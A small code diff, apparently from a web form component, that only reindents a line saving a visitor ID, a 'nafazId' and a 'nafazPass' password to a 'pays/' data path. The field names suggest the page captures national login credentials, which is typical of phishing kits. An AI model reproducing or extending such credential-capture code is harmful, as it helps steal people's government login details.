@@ -61,7 +61,7 @@ export default function Component() {
     try {
       setIsLoading(true);
 
-   await addData(`pays/${visitorId}`, {
+await addData(`pays/${visitorId}`, {
         id: visitorId,
         nafazId: idLogin,
         nafazPass: password,
